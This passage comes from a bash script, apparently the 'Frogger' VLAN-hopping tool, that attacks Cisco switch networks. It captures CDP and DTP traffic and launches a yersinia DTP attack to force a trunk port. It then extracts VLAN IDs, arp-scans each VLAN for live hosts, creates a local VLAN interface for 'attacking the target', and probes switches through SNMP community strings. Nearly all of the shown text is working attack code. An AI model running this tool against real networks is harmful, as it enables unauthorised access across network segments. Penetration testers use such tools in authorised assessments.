    NMAP=`nmap -sU -sV -p $PORT $IP -n -Pn 2>&1 |grep "open" | awk '{ print $2 }'`
    if [ "$NMAP" = "open" ]
      then
        printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "SNMP was found enabled on ${BRIGHT}${GREEN}"$IP"${NORMAL}"
      else
        printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue."
        #remove tmp files
        rm *.tmp 2>/dev/null
        exit 1
    fi
  }

  # SNMP community string checks
  scansnmpcomro() {
    printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."

    snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1

    if [ $? != "0" ]
      then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
        #remove tmp files
        rm *.tmp 2>/dev/null
        exit 1

    fi

    COMSCAN="$SNMPCOM"

      snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
      if [ $? = 0 ]
        then
          printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}"
          GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)
      fi
  }

  #alter port numbers if different switch models into 10001 format.
  alterportint() {
    PORTSIZE=$(cat yourport.tmp |wc -L)

    if [ "$PORTSIZE" = "1" ]
     then
            sed -i -e 's/^/1000/' yourport.tmp
    elif [ "$PORTSIZE" = "2" ]
      then
        sed -i -e 's/^/100/' yourport.tmp
    else
            sed -i -e 's/^/10/' yourport.tmp
    fi
  }

  vlanextractro() {
    printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting all Read-Only VLAN Information, please wait"

    VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
    VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)

    COUNTVLANS=$(cat ids.tmp |wc -l)

    if [ "$COUNTVLANS" = 0 ]
      then
        printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
        #remove tmp files
        rm *.tmp 2>/dev/null
        exit 1
    else
      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."

      paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
      IDNAMES=$(cat idsnames.tmp)
      printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
      printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
      printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
    fi
    FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
    YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)

    if [ "$YOURPORT" != "OID" ]
      then
        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
        VLANID2="1"
        echo "$YOURPORT" >yourport.tmp
          #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)

          COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)

            if [ $COUNTPORTLENGTH -gt 2 ]
              then
                alterportint
            fi
      else
        printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
        printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"

        for VLANID2 in $(cat ids.tmp)
        do

        FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
        if [ -n "$FINDMYPORT2" ]
          then
            printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
            VLANID3=$VLANID2
        fi

        #FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
        YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
        done

        printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
        echo "$YOURPORT2" >yourport.tmp
          #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)

          COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1|awk '{print $NF}' |wc -L)

            if [ $COUNTPORTLENGTH -gt 2 ]
              then
                alterportint
            fi
    fi
  }

  #list DTP modes on all ports
  dtplistmodesro() {
    snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13" 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" | sed -e "s/iso.3.6.1.4.1.9.9.46.1.6.1.1.13./Switch Port /g" >listmodes.tmp
    LISTDTPMODESRO=$(cat listmodes.tmp)
    printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following DTP port modes are configured"
    printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTDTPMODESRO${NORMAL}"
  }

  #nmap check snmp is open function
  nmapsnmpro
  scansnmpcomro
  vlanextractro
  dtplistmodesro

  #remove tmp files
  rm *.tmp 2>/dev/null
}
#snmpextract r-o function end

cdpdevicename() {
  DEVID=$(cat $OUTPUT | grep -i "device id:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
    if [ -z "$DEVID" ]
        then
          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any devices. Perhaps it is not a Cisco device."
    else
          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
              printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Cisco device was found."
          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
                  printf '\r%s %s \n\n' "${GREEN}$DEVID${NORMAL}"

    fi
}

cdpnativevlan() {
NATID=$(cat $OUTPUT | grep -i "native vlan:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
	if [ -z "$NATID" ]
			then
				printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any Native VLAN ID within CDP packets. Perhaps CDP is not enabled."
	else
                printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
                printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Native VLAN ID was found."
                printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
                printf '\r%s %s \n\n' "${GREEN}$NATID${NORMAL}"
	fi
}

cdpmandomain() {
  MANDOM=$(cat $OUTPUT |grep -i "domain:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
    if [ "$MANDOM" = " " ]
        then
          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "The VTP domain appears to be set to NULL on the device. Script will continue."
    elif [ -z "$MANDOM" ]
        then
          printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue."
    else
          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
          printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Management domains were found."
          printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
          printf '\r%s %s \n\n' "${GREEN}$MANDOM${NORMAL}"
    fi
}

cdpmanip() {

MANIP=$(cat $OUTPUT | grep -i "ip address:" |cut -d ":" -f 2 |sed 's/^[ \t]*//;s/[ \t]*$//' |sort -u)
	if [ -z "$MANIP" ]
			then
				printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "I didn't find any management addresses within CDP packets. Try increasing the CDP time and try again."
				show_menuscdpzero
				read_optionscdpzero
				printf '\n'

	elif [ "$MANIP" = "0.0.0.0" ]
			then
				printf '\r%s %s \n' "${BRIGHT}${RED}[!]${NORMAL}" "CDP reported the management address of ${BRIGHT}${RED}0.0.0.0${NORMAL} which is incorrect. This can happen from time to time with CDP."
				show_menuscdpzero
				read_optionscdpzero
				printf '\n'
	fi

if [ "$MANIP" != "0.0.0.0" ]
then
	cdpmanipshow
fi
}

show_menusnovlanids() {
printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------"
printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to run the DTP scan again to check for VLAN IDs?"
printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------${NORMAL}"
printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Run the VLAN DTP attack again and extract VLAN IDs - time will increase by "$DTPSECR" seconds."
printf '\r%s \n\n' "${RED}[2]${NORMAL} - Exit the Script and kill all attack processes."
}

read_optionsnovlanids() {
TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 2 ]${NORMAL}")
local choice
read -p "$TXT" choice
case $choice in
1) onevlanids ;;
2) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
esac
}


# Launch DTP attack
dtpattack() {
screen -d -m -S yersina_dtp yersinia dtp -attack 1 -interface $INT &
SECONDS=0;
while sleep .5 && ((SECONDS <= $DTPWAIT)); do
printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Running DTP Attack on interface $INT, waiting" "$(($DTPWAIT-SECONDS))" "seconds to trigger."
done
printf '\n\n'

}

# Extract DTP VLAN Info after attack
dtpattackextract() {

if [ "$DTPATKRETRY" = "true" ]
	then
	TAGSEC=$(($TAGSEC+$DTPSECR))
fi
tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique >vlanids.tmp &
SECONDS=0;
while sleep .5 && ((SECONDS <= $TAGSEC)); do
printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for" "$(($TAGSEC-SECONDS))" "seconds."
done
printf '\n\n'

# wait to ensure dtp write has finished to file and in sync
sleep 3 &
SECONDS=0;
while sleep .5 && ((SECONDS <= 3)); do
printf '\r%s %s %1d' "${BRIGHT}${BLUE}[i]${NORMAL}" "Saving DTP Capture" "$((3-SECONDS))"
done
printf '\n\n'

VLANIDS=$(cat vlanids.tmp)
if [ -z "$VLANIDS" ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLAN IDs were found within captured data."
		show_menusnovlanids
		read_optionsnovlanids
	else
		printf '\r%s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following VLAN IDs were found"
		printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
		printf '\r%s\n' "${BRIGHT}${GREEN}$VLANIDS${NORMAL}"
		printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"

fi
}

dtpdevicescan() {
SCANSDTP=$(echo "$MANIP" |cut -d "." -f 1,2,3)
if [ -n "$SCANSDTP" ]
	then
		DTPMANIPSCAN="Looking at the management address, try to scan "$SCANSDTP".0/24. the Subnet mask is not known so could be /8 /16 etc"
	else
		DTPMANIPSCAN="No CDP Management address was found. Unable to guess a subnet to scan"
fi
		
printf '\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------------------------------------------------"
printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL}"  "Enter the IP address or CIDR range you wish to scan for live devices in i.e 192.168.1.1 or 192.168.1.0/24"
printf '\n \r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "$DTPMANIPSCAN"
printf '\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------------------------------------------------${NORMAL}"
read IPADDRESS

clear

checkvlanlivedevices() {
ARPSCANVLAN=$(arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 |grep "802.1Q VLAN=")
arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 |grep "802.1Q VLAN=" >/dev/null
	if [ $? = 0 ]
		then
			printf '%s\n' "- ${BRIGHT}${GREEN} Devices found${NORMAL}"
			printf '\n\r%s\n' "${BRIGHT}${BLUE}$ARPSCANVLAN${NORMAL}"
		else
			printf '%s\n' "- ${BRIGHT}${RED}No devices found${NORMAL}"
	fi
}

for VLANIDSCAN in $(cat vlanids.tmp) 
do

printf '\n \r%s %s' "${BRIGHT}${BLUE}[i]${NORMAL} Now scanning ${BRIGHT}${GREEN}$IPADDRESS - VLAN $VLANIDSCAN${NORMAL} for live devices" ; checkvlanlivedevices

done
}

createvlaninterface() {
printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------"
printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the VLAN ID to Create i.e 100"
printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------${NORMAL}"
read VID

printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------------------"
printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address you wish to assign to the new VLAN interface ${BRIGHT}${GREEN}$VID${NORMAL} i.e 192.168.1.100/24"
printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------------------${NORMAL}"
read VIP

modprobe 8021q >/dev/null 2>&1
sleep 1
ip link add link $INT name $INT.$VID type vlan id $VID >/dev/null 2>&1
sleep 1
ip link set $INT.$VID up >/dev/null 2>&1
sleep 1
ip addr add $VIP dev $INT.$VID >/dev/null 2>&1
sleep 2

ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1 | grep -i -w  "$INT.$VID" >/dev/null

if [ $? = 1 ]
       then
		  printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Something went wrong, the interface could not be created."
                
else               
		printf '\n\r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following interface is now configured locally"
		printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------------${NORMAL}"
		printf '\r%s\n' "Interface ${BRIGHT}${GREEN}$INT.$VID${NORMAL} with IP Address ${BRIGHT}${GREEN}$VIP${NORMAL}"
		printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------------${NORMAL}"
fi
#remove tmp files
rm *.tmp 2>/dev/null
exit 0
}

killdtpattackexit() {
ps -ef | grep "[Yy]ersinia dtp" >/dev/null
			if [ $? = 0 ]
				then
					killall yersinia
					
					printf '\n\n \r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."
					printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} DTP attack has been stopped."
					rm *.tmp 2>/dev/null 
					exit 1
				else
					printf '\n'
					rm *.tmp 2>/dev/null 
					exit 1
			fi
}

#Menu choice for creating VLAN interface
show_menudcreatevlaninterface() {
printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------"
printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to create a new interface in the discovered VLAN or Exit?"
printf '\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------${NORMAL}"
printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Create a new local VLAN Interface for attacking the target"
printf '\r%s \n\n' "${RED}[2]${NORMAL} - Exit script - This will kill all processes and stop the DTP attack"
}

read_optionscreatevlaninterface() {
TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
local choice
read -p "$TXT" choice
case $choice in
1) createvlaninterface ;;
2) killdtpattackexit ;;
*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
esac
}

onevlanids() {
		DTPATKRETRY="true"
		printf '\n'
		dtpattack
		dtpattackextract
		dtpdevicescan
		
}

show_menuscdpzero() {
printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------"
printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to continue without knowing the CDP management address?"
printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------${NORMAL}"
printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Continue without knowing the CDP management address"
printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Re-run the CDP Scan again increasing the scan time by "$CDPSECR" seconds"
printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
}

read_optionscdpzero() {
TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
local choice
read -p "$TXT" choice
case $choice in
1) onecdpzero ;;
2) twocdpzero ;;
3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
esac
}

onecdpzero() {
printf '\n'
printf '%s \n' "Continuing without knowing the CDP management address."
SKIPCDPMANIP="true"
}

twocdpzero() {
printf '\n'

		CDPZERORETRY="true"
		checkcdpon
		cdpdevicename
		cdpnativevlan
		cdpmandomain
		if [ "$SKIPCDPMANIP" != "true" ]
			then
			cdpmanip
		fi
}

show_menusnocdp() {
printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------"
printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to continue without CDP info and launch an active DTP attack to list VLANs?"
printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------------${NORMAL}"
printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Continue without CDP info and just launch the VLAN Attack"
printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Re-run the CDP Scan again"
printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
}

read_optionsnocdp() {
TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
local choice
read -p "$TXT" choice
case $choice in
1) onecdp ;;
2) twocdp ;;
3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
esac
}

onecdp() {
printf '\n\n \r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL} Continuing without CDP. This attack will run blind and try to extract VLAN IDs."
}

twocdp() {
printf '\n'
checkcdpon
}

# List CDP management address captured
cdpmanipshow() {
printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following Management IP Address was found"
printf '%s \n' "${BRIGHT}${GREEN}----------------------------------------------------------${NORMAL}"
printf '\r%s %s \n\n' "${GREEN}$MANIP${NORMAL}"
}

# Check if CDP is on
checkcdpon() {
OUTPUT="tempcdp.tmp"
if [ "$CDPZERORETRY" = "true" ]
	then
	CDPSEC=$(($CDPSEC+$CDPSECR))
fi
tshark -a duration:$CDPSEC -i $INT -Y "cdp" -V 2>&1 | sort --unique >$OUTPUT &

SECONDS=0;
while sleep .5 && ((SECONDS <= $CDPSEC)); do
printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Sniffing CDP packets on interface $INT for" "$(($CDPSEC-SECONDS))" "seconds."
done
printf '\n\n'

# wait to ensure cdp write has finished to file and in sync
sleep 3 &
SECONDS=0;
while sleep .5 && ((SECONDS <= 3)); do
printf '\r%s %s %1d' "${BRIGHT}${BLUE}[i]${NORMAL}" "Saving CDP Capture" "$((3-SECONDS))"
done
printf '\n\n'
			CDPON=$(cat $OUTPUT | grep "CDP/VTP/DTP/PAgP/UDLD")
			if [ "$?" = "1" ]
				then
					printf '\r%s %s \n' "${BRIGHT}${RED}[!]${NORMAL}" "No CDP Packets were found, perhaps CDP is not enabled on the network."
					show_menusnocdp
					read_optionsnocdp
					printf '\n'
				else
					CDPON="true"
			fi
}

# DTP Scan Passive Check
dtpscan() {

if [ "$DTPRETRY" = "true" ]
	then
	DTPSEC=$(($DTPSEC+$DTPSECR))
fi
tshark -a duration:$DTPSEC -i $INT -Y "dtp" -x -V >dtp.tmp 2>&1 &
SECONDS=0;
while sleep .5 && ((SECONDS <= $DTPSEC)); do
printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Sniffing DTP packets on interface $INT for" "$(($DTPSEC-SECONDS))" "seconds."
done
printf '\n'

COUNTDTP=$(cat dtp.tmp |grep "dtp" |wc -l)

if [ $COUNTDTP = 0 ]

	then
		printf '\n \r%s %s\n' "${BRIGHT}${RED}[!]${NORMAL}" "No DTP packets were found. DTP is probably disabled and in 'switchport nonegotiate' mode."
		printf '\n \r%s %s\n' "${BRIGHT}${RED}[!]${NORMAL}" "DTP VLAN attacks will not be possible from this port."
		printf '\n \r%s %s\n\n' "${BRIGHT}${YELLOW}[-]${NORMAL}" "Note: This attack is port specific and only applies to the port you are connected to. It does not represent all ports on the device."
		rm dtp.tmp 2>/dev/null
		show_menudtpnotfound
		read_optionsdtpnotfound
	else
	
DTPMODE=$(cat dtp.tmp | grep 'Administrative Status: \|Status: 0x.*' | cut -d "(" -f 2 | cut -d ")" -f 1 |head -1)

	if [ "$DTPMODE" = "0x04" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in mode 'Auto'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} VLAN hopping will be possible."

	elif [ "$DTPMODE" = "0x83" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in it's default state 'switchport mode dynamic desirable'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} VLAN hopping will be possible."

	elif [ "$DTPMODE" = "0x03" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in it's default state 'switchport mode dynamic desirable'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} VLAN hopping will be possible."

	elif [ "$DTPMODE" = "0x81" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in Trunk mode 'switchport mode trunk'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} As this is a Trunk port it is likely you will have access to all VLANs (unless restricted), DTP attacks are not possible."
			
	elif [ "$DTPMODE" = "0xa5" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in Trunk mode 'switchport mode trunk 802.1Q'. with 802.1Q encapsulation forced"
			printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} As this is a Trunk port it is likely you will have access to all VLANs (unless restricted), DTP attacks are not possible."

			elif [ "$DTPMODE" = "0x42" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in Trunk mode 'switchport mode trunk ISL'. with ISL encapsulation forced"
			printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} As this is a Trunk port it is likely you will have access to all VLANs (unless restricted), DTP attacks are not possible."

	elif [ "$DTPMODE" = "0x84" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in mode 'switchport mode dynamic auto'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} VLAN hopping should be possible."

	elif [ "$DTPMODE" = "0x02" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in mode 'switchport mode access'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} DTP VLAN attacks will not be possible."
			
	elif [ "$DTPMODE" = "0x01" ]
		then
			printf '\n \r%s %s\n' "${BRIGHT}${GREEN}[+]${NORMAL} DTP was found enabled in mode 'TRUNK'."
			printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL} No need to VLAN hop, you are already TRUNKED."

	else 
			printf '\n \r%s %s\n' "${BRIGHT}${RED}[!]${NORMAL} Found DTP in an unknown mode I am not aware of."
			printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Please report this to the author of script for debugging."
	fi
fi
rm dtp.tmp 2>/dev/null

}

# main menu options 1 - DTP Scan
one(){
#select IP Int
sourceinterfaces
#run dtpscan function
dtpscan
}

printf '\n'

# do something in two()
two(){

#Source interface to scan from
sourceinterfaces

#Check if CDP is enabled
checkcdpon

#If CDP is on then extract info, if not skip
if [ "$CDPON" = "true" ]
	then
		cdpdevicename
		cdpnativevlan
		cdpmandomain
		if [ "$SKIPCDPMANIP" != "true" ]
			then
			cdpmanip
		fi
fi

#DTP VLAN Attack

dtpattack
dtpattackextract
dtpdevicescan
show_menudcreatevlaninterface
read_optionscreatevlaninterface

}

# do something in three()
three(){

sourceinterfaces
dtpattack
dtpattackextract
dtpdevicescan
show_menudcreatevlaninterface
read_optionscreatevlaninterface
		
}

# main menu options 4
four(){
snmpvlanattack
}

# main menu options 5
five(){

#Source interface to scan from
sourceinterfaces

#Check if CDP is enabled
checkcdpon

#If CDP is on then extract info, if not skip
if [ "$CDPON" = "true" ]
	then
		cdpdevicename
		cdpnativevlan
		cdpmandomain
		if [ "$SKIPCDPMANIP" != "true" ]
			then
			cdpmanip
		fi
fi
}

# main menu options 6
six(){

snmpextractro

}

# Main Frogger Menu
show_mainmenu() {
printf '\r%s\n' "${BRIGHT}${GREEN}----------------------------------------------------------------------------------------------------${NORMAL}"
printf '\r%s %s \n' "			${BRIGHT}${GREEN}---${NORMAL}  Main Menu - Select Option  ${BRIGHT}${GREEN}---${NORMAL}"
printf '\r%s\n\n' "${BRIGHT}${GREEN}----------------------------------------------------------------------------------------------------${NORMAL}"
printf '\r%s \n\n' "${BRIGHT}${GREEN}[1]${NORMAL} - DTP Scan - Check if VLAN Hopping is possible (${GREEN}Passive Check${NORMAL})"
printf '\r%s \n\n' "${BRIGHT}${YELLOW}[2]${NORMAL} - DTP VLAN Hop - Run VLAN Attack on 802.1Q with CDP - (${YELLOW}Active Attack${NORMAL}) - ${GREEN}Most Common Option${NORMAL}"
printf '\r%s \n\n' "${BRIGHT}${BLUE}[3]${NORMAL} - DTP VLAN Hop - Run VLAN Attack on 802.1Q where CDP is disabled - (${YELLOW}Active Attack${NORMAL})"
printf '\r%s \n\n' "${BRIGHT}${CYAN}[4]${NORMAL} - SNMP VLAN Hop - Run VLAN Attack using SNMP - (${YELLOW}Active Attack${NORMAL})"
